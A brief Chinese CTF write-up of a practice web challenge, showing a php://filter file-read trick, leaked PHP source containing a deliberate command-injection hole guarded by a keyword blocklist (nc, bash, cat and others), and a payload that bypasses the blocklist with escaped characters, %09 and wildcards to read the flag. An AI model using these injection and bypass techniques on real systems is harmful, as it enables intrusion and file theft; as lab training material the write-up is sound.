# 白帽子寻宝记

## 端午就该吃粽子

- dirsearch扫描了一下有login.php
- 发现url为:`http://www.bmzclub.cn:22183/login.php?zhongzi=snow.php`
- php伪协议读取`http://www.bmzclub.cn:22183/login.php?zhongzi=php://filter/read=convert.base64-encode/resource=index.php`
- base64解码如下:
```php
<?php
error_reporting(0);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/(;|'| |>|]|&| |python|sh|nc|tac|rev|more|tailf|index|php|head|nl|sort|less|cat|ruby|perl|bash|rm|cp|mv|\*)/i", $ip)){
      die("<script language='javascript' type='text/javascript'>
      alert('no no no!')
      window.location.href='index.php';</script>");
  }else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
      die("<script language='javascript' type='text/javascript'>
      alert('no flag!')
      window.location.href='index.php';</script>");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo $a;
}
?>
```

- cat绕过: c\a\t
- 空格绕过: ${IFS},%09
- flag绕过：????

- payload: 1|c\a\t%09/????

```
http://www.bmzclub.cn:22183/index.php?url=1|c\a\t%09/????
```